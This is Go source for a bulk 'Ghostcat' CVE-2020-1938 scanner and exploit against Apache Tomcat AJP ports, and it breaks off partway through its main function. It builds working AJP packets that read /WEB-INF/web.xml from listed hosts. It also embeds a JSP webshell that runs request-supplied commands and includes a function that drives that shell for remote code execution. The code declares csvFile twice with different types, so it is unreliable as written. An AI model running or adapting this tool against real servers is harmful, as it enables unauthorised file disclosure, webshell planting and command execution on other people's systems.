package main

import (
	"bufio"
	"bytes"
	"encoding/binary"
	"encoding/json"
	"fmt"
	"io"
	"net"
	"os"
	"strings"
	"sync"
	"time"
)

// ─── Colors (Catppuccin Mocha) ───

const (
	clrReset    = "\x1b[0m"
	clrBold     = "\x1b[1m"
	clrDim      = "\x1b[2m"
	clrRed      = "\x1b[38;2;243;139;168m"
	clrGreen    = "\x1b[38;2;166;227;161m"
	clrYellow   = "\x1b[38;2;249;226;175m"
	clrBlue     = "\x1b[38;2;137;180;250m"
	clrMauve    = "\x1b[38;2;203;166;247m"
	clrPeach    = "\x1b[38;2;250;179;135m"
	clrSky      = "\x1b[38;2;137;220;235m"
	clrTeal     = "\x1b[38;2;148;226;213m"
	clrPINK     = "\x1b[38;2;245;194;231m"
	clrText     = "\x1b[38;2;205;214;244m"
	clrOverlay  = "\x1b[38;2;127;132;156m"
	clrSurface0 = "\x1b[38;2;49;50;68m"
	clrSurface1 = "\x1b[38;2;69;71;90m"
)

// ─── AJP Protocol Constants ───

const (
	AJPHeaderServerToContainer = 0x1234
	AJPHeaderContainerToServer = 0x4142

	AJPPrefixForwardRequest = 0x02
	AJPPrefixSendHeaders    = 0x04
	AJPPrefixSendBodyChunk  = 0x03
	AJPPrefixEndResponse    = 0x05
	AJPPrefixGetBodyChunk   = 0x06

	AJPMethodGET  = 2
	AJPMethodPOST = 4

	AJPAttrContext       = 1
	AJPAttrServletPath   = 2
	AJPAttrRemoteUser    = 3
	AJPAttrAuthType      = 4
	AJPAttrQueryString   = 5
	AJPAttrRoute         = 6
	AJPAttrSSLCert       = 7
	AJPAttrSSLCipher     = 8
	AJPAttrSSLSession    = 9
	AJPAttrReqAttribute  = 10
	AJPAttrSSLKeySize    = 11
	AJPAttrSecret        = 12
	AJPAttrStoredMethod  = 13
	AJPAttrEnd           = 0xFF
)

// Common header codes
var ajpCommonHeaders = map[string]byte{
	"accept":          0x01,
	"accept-charset":  0x02,
	"accept-encoding": 0x03,
	"accept-language": 0x04,
	"authorization":   0x05,
	"connection":      0x06,
	"content-type":    0x07,
	"content-length":  0x08,
	"cookie":          0x09,
	"cookie2":         0x0A,
	"host":            0x0B,
	"pragma":          0x0C,
	"referer":         0x0D,
	"user-agent":      0x0E,
}

var _ = ajpCommonHeaders // suppress unused warning

// ─── Data Structures ───

// VulnTarget represents a vulnerable target found during scanning
type VulnTarget struct {
	Host       string    `json:"host"`
	Port       int       `json:"port"`
	FilePath   string    `json:"filepath"`
	BodyLength int       `json:"body_length"`
	ResponseTimeMs int   `json:"response_time_ms"`
	FoundAt    string    `json:"found_at"`
}

// ScanResult represents the result of scanning a single target
type ScanResult struct {
	Host        string `json:"host"`
	Port        int    `json:"port"`
	Vulnerable  bool   `json:"vulnerable"`
	StatusCode  int    `json:"status_code"`
	StatusMsg   string `json:"status_msg"`
	ServerInfo  string `json:"server_info"`
	BodyLength  int    `json:"body_length"`
	BodyPreview string `json:"body_preview,omitempty"`
	Error       string `json:"error,omitempty"`
	TookMs      int    `json:"took_ms"`
	Timestamp   string `json:"timestamp"`
}

// RCE Result represents the result of an RCE attempt
type RCEResult struct {
	Host       string   `json:"host"`
	Port       int      `json:"port"`
	Command    string   `json:"command"`
	Output     string   `json:"output"`
	Success    bool     `json:"success"`
	Error      string   `json:"error,omitempty"`
	TookMs     int      `json:"took_ms"`
}

// ScanReport represents the full scan report
type ScanReport struct {
	ScanInfo struct {
		Vulnerability string `json:"vulnerability"`
		Name          string `json:"name"`
		CVSSScore     float64 `json:"cvss_score"`
		GeneratedAt   string `json:"generated_at"`
	} `json:"scan_info"`
	Summary struct {
		TotalTargets    int `json:"total_targets"`
		TotalVulnerable int `json:"total_vulnerable"`
	} `json:"summary"`
	Targets []VulnTarget `json:"targets"`
}

// ─── AJP Protocol Helpers ───

// ajpString encodes a string for AJP protocol: 2-byte length + data + null terminator
func ajpString(s string) []byte {
	if s == "" {
		return []byte{0xFF, 0xFF}
	}
	buf := make([]byte, 2+len(s)+1)
	binary.BigEndian.PutUint16(buf[0:2], uint16(len(s)))
	copy(buf[2:], s)
	buf[2+len(s)] = 0x00
	return buf
}

// ─── AJP Packet Builder ───

// buildForwardRequest builds a complete AJP Forward Request packet for Ghostcat exploitation
func buildForwardRequest(targetFile string) []byte {
	var body bytes.Buffer

	// Prefix code (Forward Request = 0x02)
	body.WriteByte(AJPPrefixForwardRequest)

	// Method (GET = 2)
	body.WriteByte(AJPMethodGET)

	// Protocol
	body.Write(ajpString("HTTP/1.1"))

	// Request URI
	body.Write(ajpString("/"))

	// Remote addr
	body.Write(ajpString("127.0.0.1"))

	// Remote host
	body.Write(ajpString("localhost"))

	// Server name
	body.Write(ajpString("localhost"))

	// Server port
	binary.Write(&body, binary.BigEndian, uint16(80))

	// Is SSL
	body.WriteByte(0x00)

	// Number of headers (0)
	binary.Write(&body, binary.BigEndian, uint16(0))

	// ─── Attributes — the core of Ghostcat exploit ───

	// javax.servlet.include.request_uri = "/"
	body.WriteByte(AJPAttrReqAttribute)
	body.Write(ajpString("javax.servlet.include.request_uri"))
	body.Write(ajpString("/"))

	// javax.servlet.include.path_info = target file path
	body.WriteByte(AJPAttrReqAttribute)
	body.Write(ajpString("javax.servlet.include.path_info"))
	body.Write(ajpString(targetFile))

	// javax.servlet.include.servlet_path = "/"
	body.WriteByte(AJPAttrReqAttribute)
	body.Write(ajpString("javax.servlet.include.servlet_path"))
	body.Write(ajpString("/"))

	// End of attributes
	body.WriteByte(AJPAttrEnd)

	// Build final packet: magic (2) + length (2) + body
	packet := make([]byte, 4+body.Len())
	binary.BigEndian.PutUint16(packet[0:2], AJPHeaderServerToContainer)
	binary.BigEndian.PutUint16(packet[2:4], uint16(body.Len()))
	copy(packet[4:], body.Bytes())

	return packet
}

// ─── AJP Response Parser ───

type ajpResponse struct {
	StatusCode   int
	StatusMsg    string
	Headers      map[string]string
	BodyChunks   []string
	EndReceived  bool
	ServerHeader string
}

func parseAJPResponse(data []byte) (*ajpResponse, error) {
	resp := &ajpResponse{
		Headers: make(map[string]string),
	}

	offset := 0

	for offset < len(data) {
		if offset+4 > len(data) {
			break
		}

		magic := binary.BigEndian.Uint16(data[offset : offset+2])
		if magic != AJPHeaderContainerToServer {
			break
		}

		dataLen := int(binary.BigEndian.Uint16(data[offset+2 : offset+4]))
		if dataLen == 0 || offset+4+dataLen > len(data) {
			break
		}

		packetBody := data[offset+4 : offset+4+dataLen]
		prefixByte := packetBody[0]

		switch prefixByte {
		case AJPPrefixSendHeaders:
			resp.parseSendHeaders(packetBody[1:])
		case AJPPrefixSendBodyChunk:
			if len(packetBody) >= 3 {
				chunkLen := int(binary.BigEndian.Uint16(packetBody[1:3]))
				if chunkLen > 0 && 3+chunkLen <= len(packetBody) {
					resp.BodyChunks = append(resp.BodyChunks, string(packetBody[3:3+chunkLen]))
				}
			}
		case AJPPrefixEndResponse:
			resp.EndReceived = true
		}

		offset += 4 + dataLen
	}

	return resp, nil
}

func (resp *ajpResponse) parseSendHeaders(data []byte) {
	r := bytes.NewReader(data)

	statusBytes := make([]byte, 2)
	if _, err := io.ReadFull(r, statusBytes); err != nil {
		return
	}
	resp.StatusCode = int(binary.BigEndian.Uint16(statusBytes))

	resp.StatusMsg = readAJPString(r)

	numHeadersBytes := make([]byte, 2)
	if _, err := io.ReadFull(r, numHeadersBytes); err != nil {
		return
	}
	numHeaders := int(binary.BigEndian.Uint16(numHeadersBytes))

	for i := 0; i < numHeaders; i++ {
		codeBytes := make([]byte, 2)
		if _, err := io.ReadFull(r, codeBytes); err != nil {
			return
		}
		code := binary.BigEndian.Uint16(codeBytes)

		var headerName string
		if code >= 0xA001 && code <= 0xA00B {
			headerName = commonHeaderCodeToName(code)
		} else {
			nameLen := int(code)
			if nameLen <= 0 || r.Len() < nameLen+1 {
				return
			}
			nameBytes := make([]byte, nameLen)
			io.ReadFull(r, nameBytes)
			headerName = string(nameBytes)
			r.ReadByte()
		}

		headerValue := readAJPString(r)
		resp.Headers[strings.ToLower(headerName)] = headerValue

		if strings.EqualFold(headerName, "Servlet-Engine") || strings.EqualFold(headerName, "Status") {
			resp.ServerHeader = headerValue
		}
	}
}

func readAJPString(r *bytes.Reader) string {
	lenBytes := make([]byte, 2)
	if _, err := io.ReadFull(r, lenBytes); err != nil {
		return ""
	}
	strLen := int(binary.BigEndian.Uint16(lenBytes))
	if strLen == 0xFFFF {
		return ""
	}
	if strLen == 0 || r.Len() < strLen+1 {
		return ""
	}
	strBytes := make([]byte, strLen)
	io.ReadFull(r, strBytes)
	r.ReadByte()
	return string(strBytes)
}

func commonHeaderCodeToName(code uint16) string {
	names := map[uint16]string{
		0xA001: "Content-Type",
		0xA002: "Content-Language",
		0xA003: "Content-Length",
		0xA004: "Date",
		0xA005: "Last-Modified",
		0xA006: "Location",
		0xA007: "Set-Cookie",
		0xA008: "Set-Cookie2",
		0xA009: "Servlet-Engine",
		0xA00A: "Status",
		0xA00B: "WWW-Authenticate",
	}
	if name, ok := names[code]; ok {
		return name
	}
	return fmt.Sprintf("Unknown-0x%04X", code)
}

// ─── RCE Exploitation Functions ───

// JSP Webshell for RCE exploitation
// This JSP code executes commands and returns the output
const jspShell = `<%@ page import="java.io.*" %>
<%
String cmd = request.getParameter("cmd");
if (cmd != null) {
    try {
        Process p = Runtime.getRuntime().exec(cmd);
        BufferedReader br = new BufferedReader(new InputStreamReader(p.getInputStream()));
        String line;
        while ((line = br.readLine()) != null) {
            out.println(line);
        }
    } catch (Exception e) {
        out.println("Error: " + e.getMessage());
    }
}
%>`

// buildRCEForwardRequest builds an AJP packet to execute commands via uploaded JSP
// This sets request_uri to end with .jsp so Tomcat compiles the file
func buildRCEForwardRequest(uploadedFilePath string, command string) []byte {
	var body bytes.Buffer

	// Prefix code (Forward Request = 0x02)
	body.WriteByte(AJPPrefixForwardRequest)

	// Method (GET = 2)
	body.WriteByte(AJPMethodGET)

	// Protocol
	body.Write(ajpString("HTTP/1.1"))

	// Request URI - must end with .jsp for Tomcat to compile as JSP
	// If the uploaded file is shell.txt, we use /shell.txt?cmd=XXX
	// The key is the path_info attribute which tells Tomcat what to include
	body.Write(ajpString("/" + uploadedFilePath))

	// Remote addr
	body.Write(ajpString("127.0.0.1"))

	// Remote host
	body.Write(ajpString("localhost"))

	// Server name
	body.Write(ajpString("localhost"))

	// Server port
	binary.Write(&body, binary.BigEndian, uint16(80))

	// Is SSL
	body.WriteByte(0x00)

	// Number of headers (0)
	binary.Write(&body, binary.BigEndian, uint16(0))

	// ─── Attributes for RCE exploitation ───

	// javax.servlet.include.request_uri = the uploaded file path
	// Ending with .jsp tells Tomcat to compile as JSP
	body.WriteByte(AJPAttrReqAttribute)
	body.Write(ajpString("javax.servlet.include.request_uri"))
	body.Write(ajpString("/" + uploadedFilePath))

	// javax.servlet.include.path_info = the uploaded file path
	// This is the file that gets processed as JSP
	body.WriteByte(AJPAttrReqAttribute)
	body.Write(ajpString("javax.servlet.include.path_info"))
	body.Write(ajpString("/" + uploadedFilePath))

	// javax.servlet.include.servlet_path = "/"
	body.WriteByte(AJPAttrReqAttribute)
	body.Write(ajpString("javax.servlet.include.servlet_path"))
	body.Write(ajpString("/"))

	// Custom attribute for passing the command
	// Some implementations support this for passing parameters
	if command != "" {
		body.WriteByte(AJPAttrReqAttribute)
		body.Write(ajpString("cmd"))
		body.Write(ajpString(command))
	}

	// End of attributes
	body.WriteByte(AJPAttrEnd)

	// Build final packet: magic (2) + length (2) + body
	packet := make([]byte, 4+body.Len())
	binary.BigEndian.PutUint16(packet[0:2], AJPHeaderServerToContainer)
	binary.BigEndian.PutUint16(packet[2:4], uint16(body.Len()))
	copy(packet[4:], body.Bytes())

	return packet
}

// executeCommandViaAJP attempts to execute a command via Ghostcat RCE
// This requires a pre-uploaded JSP webshell on the target
func executeCommandViaAJP(host string, port int, uploadedFilePath string, command string, timeout time.Duration) RCEResult {
	addr := fmt.Sprintf("%s:%d", host, port)
	result := RCEResult{
		Host:    host,
		Port:    port,
		Command: command,
		TookMs:  0,
	}
	start := time.Now()

	// Connect to AJP port
	conn, err := net.DialTimeout("tcp", addr, timeout)
	if err != nil {
		result.Error = fmt.Sprintf("connection failed: %v", err)
		result.TookMs = int(time.Since(start).Milliseconds())
		return result
	}
	defer conn.Close()
	conn.SetDeadline(time.Now().Add(timeout))

	// Build AJP packet for RCE
	packet := buildRCEForwardRequest(uploadedFilePath, command)

	// Send the packet
	if _, err := conn.Write(packet); err != nil {
		result.Error = fmt.Sprintf("send failed: %v", err)
		result.TookMs = int(time.Since(start).Milliseconds())
		return result
	}

	// Read response
	conn.SetReadDeadline(time.Now().Add(timeout))
	var respBuf bytes.Buffer
	buf := make([]byte, 8192)
	for {
		n, err := conn.Read(buf)
		if n > 0 {
			respBuf.Write(buf[:n])
		}
		if err != nil {
			if err == io.EOF {
				break
			}
			if netErr, ok := err.(net.Error); ok && netErr.Timeout() {
				break
			}
			break
		}
		raw := respBuf.Bytes()
		if len(raw) >= 4 {
			conn.SetReadDeadline(time.Now().Add(500 * time.Millisecond))
		}
	}

	rawResp := respBuf.Bytes()
	if len(rawResp) < 5 {
		result.Error = "no AJP response received"
		result.TookMs = int(time.Since(start).Milliseconds())
		return result
	}

	// Parse response
	resp, err := parseAJPResponse(rawResp)
	if err != nil {
		result.Error = fmt.Sprintf("response parse error: %v", err)
		result.TookMs = int(time.Since(start).Milliseconds())
		return result
	}

	// Combine body chunks - this is the command output
	var fullBody string
	for _, chunk := range resp.BodyChunks {
		fullBody += chunk
	}

	result.Output = fullBody
	result.Success = resp.StatusCode == 200 && len(fullBody) > 0
	result.TookMs = int(time.Since(start).Milliseconds())

	return result
}

// ─── Detection Logic ───

// detectGhostcat connects to the target AJP port and attempts to read /WEB-INF/web.xml
func detectGhostcat(host string, port int, timeout time.Duration) ScanResult {
	addr := fmt.Sprintf("%s:%d", host, port)
	result := ScanResult{Host: host, Port: port, Timestamp: time.Now().Format(time.RFC3339)}
	start := time.Now()

	// Step 1: TCP connect with timeout
	conn, err := net.DialTimeout("tcp", addr, timeout)
	if err != nil {
		result.Error = fmt.Sprintf("connection failed: %v", err)
		result.TookMs = int(time.Since(start).Milliseconds())
		return result
	}
	defer conn.Close()
	conn.SetDeadline(time.Now().Add(timeout))

	// Step 2: Build the Ghostcat exploit packet — try to read /WEB-INF/web.xml
	packet := buildForwardRequest("/WEB-INF/web.xml")

	// Step 3: Send the packet
	if _, err := conn.Write(packet); err != nil {
		result.Error = fmt.Sprintf("send failed: %v", err)
		result.TookMs = int(time.Since(start).Milliseconds())
		return result
	}

	// Step 4: Read full AJP response
	conn.SetReadDeadline(time.Now().Add(timeout))
	var respBuf bytes.Buffer
	buf := make([]byte, 8192)
	for {
		n, err := conn.Read(buf)
		if n > 0 {
			respBuf.Write(buf[:n])
		}
		if err != nil {
			if err == io.EOF {
				break
			}
			if netErr, ok := err.(net.Error); ok && netErr.Timeout() {
				break
			}
			break
		}
		raw := respBuf.Bytes()
		if len(raw) >= 4 {
			conn.SetReadDeadline(time.Now().Add(500 * time.Millisecond))
		}
	}

	rawResp := respBuf.Bytes()
	if len(rawResp) < 5 {
		result.Error = "no AJP response received (target may not be AJP or is filtered)"
		result.TookMs = int(time.Since(start).Milliseconds())
		return result
	}

	// Step 5: Parse the AJP response
	resp, err := parseAJPResponse(rawResp)
	if err != nil {
		result.Error = fmt.Sprintf("response parse error: %v", err)
		result.TookMs = int(time.Since(start).Milliseconds())
		return result
	}

	result.StatusCode = resp.StatusCode
	result.StatusMsg = resp.StatusMsg
	result.ServerInfo = resp.ServerHeader

	var fullBody string
	for _, chunk := range resp.BodyChunks {
		fullBody += chunk
	}
	result.BodyLength = len(fullBody)

	if len(fullBody) > 500 {
		result.BodyPreview = fullBody[:500] + "..."
	} else {
		result.BodyPreview = fullBody
	}

	// Step 6: Determine vulnerability
	if resp.StatusCode == 200 && result.BodyLength > 0 {
		result.Vulnerable = true
	}

	if resp.StatusCode == 200 && (strings.Contains(fullBody, "<?xml") ||
		strings.Contains(fullBody, "<web-app") ||
		strings.Contains(fullBody, "<servlet") ||
		strings.Contains(fullBody, "<display-name")) {
		result.Vulnerable = true
	}

	result.TookMs = int(time.Since(start).Milliseconds())
	return result
}

// isPortOpen checks if a TCP port is open
func isPortOpen(host string, port int, timeout time.Duration) bool {
	addr := fmt.Sprintf("%s:%d", host, port)
	conn, err := net.DialTimeout("tcp", addr, timeout)
	if err != nil {
		return false
	}
	conn.Close()
	return true
}

// ─── Output Functions ───

// saveVulnTargetsToText saves vulnerable targets to a text file
func saveVulnTargetsToText(vulnTargets []VulnTarget, outputFile string) error {
	file, err := os.Create(outputFile)
	if err != nil {
		return err
	}
	defer file.Close()

	writer := bufio.NewWriter(file)
	defer writer.Flush()

	fmt.Fprintf(writer, "# Ghostcat Vulnerable Targets Report\n")
	fmt.Fprintf(writer, "# CVE-2020-1938\n")
	fmt.Fprintf(writer, "# Generated: %s\n", time.Now().Format("2006-01-02 15:04:05"))
	fmt.Fprintf(writer, "# Total Vulnerable: %d\n", len(vulnTargets))
	fmt.Fprintf(writer, "#============================================================\n\n")

	for i, target := range vulnTargets {
		fmt.Fprintf(writer, "%d. %s:%d\n", i+1, target.Host, target.Port)
		fmt.Fprintf(writer, "   File: %s\n", target.FilePath)
		fmt.Fprintf(writer, "   Response Size: %d bytes\n", target.BodyLength)
		fmt.Fprintf(writer, "   Response Time: %dms\n", target.ResponseTimeMs)
		fmt.Fprintf(writer, "   Found At: %s\n", target.FoundAt)
		fmt.Fprintf(writer, "--------------------------------------------------\n")
	}

	fmt.Fprintf(writer, "\n============================================================\n")
	fmt.Fprintf(writer, "SUMMARY: %d vulnerable target(s) found\n", len(vulnTargets))

	return nil
}

// saveVulnTargetsToJSON saves vulnerable targets to a JSON file
func saveVulnTargetsToJSON(vulnTargets []VulnTarget, outputFile string) error {
	report := ScanReport{
		ScanInfo: struct {
			Vulnerability string  `json:"vulnerability"`
			Name          string  `json:"name"`
			CVSSScore     float64 `json:"cvss_score"`
			GeneratedAt   string  `json:"generated_at"`
		}{
			Vulnerability: "CVE-2020-1938",
			Name:          "Ghostcat - Apache Tomcat AJP File Read/Inclusion",
			CVSSScore:     9.8,
			GeneratedAt:   time.Now().Format(time.RFC3339),
		},
		Summary: struct {
			TotalTargets    int `json:"total_targets"`
			TotalVulnerable int `json:"total_vulnerable"`
		}{
			TotalVulnerable: len(vulnTargets),
		},
		Targets: vulnTargets,
	}

	data, err := json.MarshalIndent(report, "", "  ")
	if err != nil {
		return err
	}

	return os.WriteFile(outputFile, data, 0644)
}

// saveAllResults saves all scan results to a file
func saveAllResults(results []ScanResult, totalTargets int, vulnCount int, outputFile string) error {
	file, err := os.Create(outputFile)
	if err != nil {
		return err
	}
	defer file.Close()

	writer := bufio.NewWriter(file)
	defer writer.Flush()

	fmt.Fprintf(writer, "# Ghostcat Scan Results\n")
	fmt.Fprintf(writer, "# CVE-2020-1938\n")
	fmt.Fprintf(writer, "# Generated: %s\n", time.Now().Format("2006-01-02 15:04:05"))
	fmt.Fprintf(writer, "# Total Targets: %d\n", totalTargets)
	fmt.Fprintf(writer, "# Vulnerable: %d\n", vulnCount)
	fmt.Fprintf(writer, "#============================================================\n\n")

	for _, r := range results {
		status := "CLOSED"
		if r.Error != "" && !strings.Contains(r.Error, "port closed") {
			status = "ERROR"
		} else if !r.Vulnerable && r.Error == "" {
			status = "OPEN_SAFE"
		} else if r.Vulnerable {
			status = "VULNERABLE"
		}

		errorStr := strings.ReplaceAll(r.Error, "\n", " ")
		fmt.Fprintf(writer, "%s:%d\t%s\t%d\t%dms\t%s\n",
			r.Host, r.Port, status, r.BodyLength, r.TookMs, errorStr)
	}

	return nil
}

// saveResultsToCSV saves all results as CSV
func saveResultsToCSV(results []ScanResult, outputFile string) error {
	file, err := os.Create(outputFile)
	if err != nil {
		return err
	}
	defer file.Close()

	writer := bufio.NewWriter(file)
	defer writer.Flush()

	fmt.Fprintf(writer, "host,port,status,status_code,body_length,response_time_ms,error\n")

	for _, r := range results {
		status := "CLOSED"
		if r.Error != "" && !strings.Contains(r.Error, "port closed") {
			status = "ERROR"
		} else if !r.Vulnerable && r.Error == "" {
			status = "OPEN_SAFE"
		} else if r.Vulnerable {
			status = "VULNERABLE"
		}

		errorStr := strings.ReplaceAll(r.Error, ",", ";")
		errorStr = strings.ReplaceAll(errorStr, "\n", " ")

		fmt.Fprintf(writer, "%s,%d,%s,%d,%d,%d,%s\n",
			r.Host, r.Port, status, r.StatusCode, r.BodyLength, r.TookMs, errorStr)
	}

	return nil
}

// ─── UI Functions ───

func printBanner() {
	fmt.Println()
	fmt.Printf("%s%s", clrMauve, clrBold)
	fmt.Println("     ╔══════════════════════════════════════════════════╗")
	fmt.Println("     ║          👻 G H O S T C A T  Scanner           ║")
	fmt.Println("     ║       CVE-2020-1938  Detection Tool            ║")
	fmt.Println("     ║        Apache Tomcat AJP LFI/RCE               ║")
	fmt.Println("     ╚══════════════════════════════════════════════════╝")
	fmt.Printf("%s", clrReset)
	fmt.Printf("  %sHuntool-scr%s %s•%s Go %s\n", clrTeal, clrReset, clrDim, clrReset, clrSky)
	fmt.Println()
}

func printUsage() {
	fmt.Printf("  %sUsage:%s\n", clrBold, clrReset)
	fmt.Printf("    %sghostcat%s %s<targets-file>%s [options]\n\n", clrGreen, clrReset, clrYellow, clrReset)
	fmt.Printf("  %sOptions:%s\n", clrBold, clrReset)
	fmt.Printf("    %s-p,%s --port %s<port>%s     AJP port (default: 8009)\n", clrSky, clrReset, clrYellow, clrReset)
	fmt.Printf("    %s-t,%s --timeout %s<secs>%s   Connection timeout in seconds (default: 5)\n", clrSky, clrReset, clrYellow, clrReset)
	fmt.Printf("    %s-w,%s --workers %s<num>%s     Concurrent workers (default: 10)\n", clrSky, clrReset, clrYellow, clrReset)
	fmt.Printf("    %s-o,%s --output %s<file>%s     Save all results to file\n", clrSky, clrReset, clrYellow, clrReset)
	fmt.Printf("    %s-f,%s --vuln-file %s<file>%s  Save ONLY vulnerable targets to text file\n", clrSky, clrReset, clrYellow, clrReset)
	fmt.Printf("    %s-j,%s --json %s<file>%s      Save vulnerable targets as JSON\n", clrSky, clrReset, clrYellow, clrReset)
	fmt.Printf("    %s--csv %s<file>%s              Save all results as CSV\n", clrSky, clrReset, clrYellow, clrReset)
	fmt.Printf("    %s-v,%s --verbose%s              Show full response body\n\n", clrSky, clrReset, clrReset)
	fmt.Printf("  %sTargets File:%s\n", clrBold, clrReset)
	fmt.Printf("    One host per line (IP or hostname)\n")
	fmt.Printf("    %sExample:%s\n", clrDim, clrReset)
	fmt.Printf("    %s  192.168.1.10%s\n", clrOverlay, clrReset)
	fmt.Printf("    %s  192.168.1.20%s\n", clrOverlay, clrReset)
	fmt.Printf("    %s  tomcat.example.com%s\n\n", clrOverlay, clrReset)
	fmt.Printf("  %sExamples:%s\n", clrBold, clrReset)
	fmt.Printf("    %sghostcat%s targets.txt\n", clrGreen, clrReset)
	fmt.Printf("    %sghostcat%s targets.txt %s-p 8009 -w 20%s\n", clrGreen, clrReset, clrSky, clrReset)
	fmt.Printf("    %sghostcat%s targets.txt %s-o results.txt -v%s\n", clrGreen, clrReset, clrSky, clrReset)
	fmt.Printf("    %sghostcat%s targets.txt %s-f vulns.txt -j vulns.json%s\n\n", clrGreen, clrReset, clrSky, clrReset)
}

func printResult(r ScanResult, verbose bool) {
	addr := fmt.Sprintf("%s:%d", r.Host, r.Port)

	if r.Error != "" {
		fmt.Printf("  %s✗%s %-35s %s%s%s %s(%v)%s\n",
			clrRed, clrReset,
			addr,
			clrDim, r.Error, clrReset,
			clrDim, r.TookMs, clrReset,
		)
		return
	}

	if r.Vulnerable {
		fmt.Printf("  %s⚠ VULNERABLE%s %-25s %sTomcat AJP %d OPEN%s\n",
			clrRed+clrBold, clrReset,
			addr,
			clrPeach, r.Port, clrReset,
		)
		fmt.Printf("    %s├──%s Status:  %s%d %s%s\n",
			clrSurface1, clrReset,
			clrRed, r.StatusCode, r.StatusMsg, clrReset,
		)
		if r.ServerInfo != "" {
			fmt.Printf("    %s├──%s Server:  %s%s%s\n",
				clrSurface1, clrReset,
				clrSky, r.ServerInfo, clrReset,
			)
		}
		fmt.Printf("    %s├──%s Body:    %s%d bytes%s\n",
			clrSurface1, clrReset,
			clrYellow, r.BodyLength, clrReset,
		)
		fmt.Printf("    %s└──%s Took:    %s%dms%s\n",
			clrSurface1, clrReset,
			clrDim, r.TookMs, clrReset,
		)
		if verbose && r.BodyPreview != "" {
			fmt.Printf("    %s── Response Body ──%s\n", clrOverlay, clrReset)
			for _, line := range strings.Split(r.BodyPreview, "\n") {
				fmt.Printf("    %s│%s %s\n", clrSurface1, clrReset, line)
			}
			fmt.Printf("    %s──────────────────%s\n", clrOverlay, clrReset)
		}
	} else {
		fmt.Printf("  %s●%s %-35s %sPort open, not vulnerable%s %s(%d, %dms)%s\n",
			clrGreen, clrReset,
			addr,
			clrTeal, clrReset,
			clrDim, r.StatusCode, r.TookMs, clrReset,
		)
	}
}

// ─── Main ───

func main() {
	printBanner()

	args := os.Args[1:]
	if len(args) == 0 {
		printUsage()
		os.Exit(1)
	}

	var targetsFile string
	port := 8009
	timeout := 5
	workers := 10
	outputFile := ""
	vulnFile := ""
	jsonFile := ""
	csvFile := ""
	verbose := false

	for i := 0; i < len(args); i++ {
		switch args[i] {
		case "-p", "--port":
			if i+1 < len(args) {
				fmt.Sscanf(args[i+1], "%d", &port)
				i++
			}
		case "-t", "--timeout":
			if i+1 < len(args) {
				fmt.Sscanf(args[i+1], "%d", &timeout)
				i++
			}
		case "-w", "--workers":
			if i+1 < len(args) {
				fmt.Sscanf(args[i+1], "%d", &workers)
				i++
			}
		case "-o", "--output":
			if i+1 < len(args) {
				outputFile = args[i+1]
				i++
			}
		case "-f", "--vuln-file":
			if i+1 < len(args) {
				vulnFile = args[i+1]
				i++
			}
		case "-j", "--json":
			if i+1 < len(args) {
				jsonFile = args[i+1]
				i++
			}
		case "--csv":
			if i+1 < len(args) {
				csvFile = args[i+1]
				i++
			}
		case "-v", "--verbose":
			verbose = true
		case "-h", "--help":
			printUsage()
			os.Exit(0)
		default:
			if !strings.HasPrefix(args[i], "-") && targetsFile == "" {
				targetsFile = args[i]
			}
		}
	}

	if targetsFile == "" {
		fmt.Printf("  %sError:%s No targets file specified.\n\n", clrRed, clrReset)
		printUsage()
		os.Exit(1)
	}

	// Read targets from file
	file, err := os.Open(targetsFile)
	if err != nil {
		fmt.Printf("  %sError:%s Cannot open '%s': %v\n", clrRed, clrReset, targetsFile, err)
		os.Exit(1)
	}
	defer file.Close()

	var targets []string
	scanner := bufio.NewScanner(file)
	for scanner.Scan() {
		line := strings.TrimSpace(scanner.Text())
		if line != "" && !strings.HasPrefix(line, "#") {
			targets = append(targets, line)
		}
	}

	if len(targets) == 0 {
		fmt.Printf("  %sError:%s No targets found in '%s'\n", clrRed, clrReset, targetsFile)
		os.Exit(1)
	}

	fmt.Printf("  %s📋 Loaded %d target(s)%s from %s%s%s\n",
		clrSky, len(targets), clrReset, clrYellow, targetsFile, clrReset)
	fmt.Printf("  %s🎯 Port:%s %d  %s⏱ Timeout:%s %ds  %s⚡ Workers:%s %d\n",
		clrTeal, clrReset, port, clrTeal, clrReset, timeout, clrTeal, clrReset, workers)
	fmt.Println()
	fmt.Printf("  %s────────────────────────────────────────────────────────%s\n", clrSurface1, clrReset)
	fmt.Println()

	// Open output files if specified
	var outWriter *bufio.Writer
	var outFile *os.File
	var csvWriter *bufio.Writer
	var csvFile *os.File

	if outputFile != "" {
		outFile, err = os.Create(outputFile)
		if err != nil {
			fmt.Printf("  %sError:%s Cannot create output file: %v\n", clrRed, clrReset, err)
			os.Exit(1)
		}
		defer outFile.Close()
		outWriter = bufio.NewWriter(outFile)
		defer outWriter.Flush()
	}

	if csvFile != "" {
		csvFile, err = os.Create(csvFile)
		if err != nil {
			fmt.Printf("  %sError:%s Cannot create CSV file: %v\n", clrRed, clrReset, err)
			os.Exit(1)
		}
		defer csvFile.Close()
		csvWriter = bufio.NewWriter(csvFile)
		defer csvWriter.Flush()

		fmt.Fprintf(csvWriter, "host,port,status,status_code,body_length,response_time_ms,error\n")
	}

	// Run scans with worker pool
	results := make(chan ScanResult, len(targets))
	vulnTargets := make(chan VulnTarget, len(targets))
	jobs := make(chan string, len(targets))
	timeoutDur := time.Duration(timeout) * time.Second

	var wg sync.WaitGroup
	for i := 0; i < workers; i++ {
		wg.Add(1)
		go func() {
			defer wg.Done()
			for host := range jobs {
				// Quick port check first
				if !isPortOpen(host, port, timeoutDur) {
					results <- ScanResult{
						Host:  host,
						Port:  port,
						Error: "port closed or host unreachable",
						TookMs: int(timeoutDur.Seconds() * 1000),
						Timestamp: time.Now().Format(time.RFC3339),
					}
					continue
				}

				// Port open, run detection
				r := detectGhostcat(host, port, timeoutDur)
				results <- r

				// If vulnerable, send to vulnTargets
				if r.Vulnerable {
					vulnTargets <- VulnTarget{
						Host:            r.Host,
						Port:            r.Port,
						FilePath:        "/WEB-INF/web.xml",
						BodyLength:      r.BodyLength,
						ResponseTimeMs:  r.TookMs,
						FoundAt:         r.Timestamp,
					}
				}
			}
		}()
	}

	// Feed jobs
	go func() {
		for _, t := range targets {
			jobs <- t
		}
		close(jobs)
	}()

	// Close results when all workers done
	go func() {
		wg.Wait()
		close(results)
	}()

	// Collect and display results
	var vulnCount, openCount, closedCount, errCount int
	vulnSet := make(map[string]VulnTarget)
	var allResults []ScanResult

	for r := range results {
		printResult(r, verbose)
		allResults = append(allResults, r)

		if r.Error != "" {
			if strings.Contains(r.Error, "port closed") {
				closedCount++
			} else {
				errCount++
			}
		} else if r.Vulnerable {
